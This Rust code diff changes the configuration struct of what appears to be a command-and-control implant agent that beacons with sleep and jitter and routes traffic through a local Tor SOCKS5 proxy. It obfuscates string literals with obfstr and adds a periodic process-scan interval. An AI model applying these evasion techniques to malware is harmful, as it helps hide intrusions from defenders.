@@ -5,6 +5,7 @@ use std::path::Path;
 use std::env;
 use log::{info, warn, error};
 use reqwest::{Client, Proxy};
+use obfstr::obfstr;
 
 // Include the generated config file
 include!(concat!(env!("OUT_DIR"), "/config.rs"));
@@ -22,15 +23,19 @@ pub struct AgentConfig {
     pub socks5_host: String,
     #[serde(default = "default_socks5_port")]
     pub socks5_port: u16,
+    #[serde(default = "default_proc_scan_interval")]
+    pub proc_scan_interval_secs: u64,
 }
 
 fn default_socks5_host() -> String {
-    "127.0.0.1".to_string()
+    obfstr!("127.0.0.1").to_string()
 }
 
 fn default_socks5_port() -> u16 {
     9050
 }
+
+fn default_proc_scan_interval() -> u64 { 300 }
 
 impl Default for AgentConfig {
     fn default() -> Self {
@@ -39,14 +44,16 @@ impl Default for AgentConfig {
             sleep_interval: 5,
             jitter: 2,
             payload_id: String::new(),
-            protocol: String::from("http"),
+            protocol: obfstr!("http").to_string(),
             socks5_enabled: true,
-            socks5_host: String::from("127.0.0.1"),
+            socks5_host: obfstr!("127.0.0.1").to_string(),
             socks5_port: 9050,
+            proc_scan_interval_secs: default_proc_scan_interval(),
         }
     }
 }
 
+// The AgentConfig struct is used to load and manage the agent's configuration.
 impl AgentConfig {
     pub fn load() -> io::Result<Self> {
         // First try using the embedded config
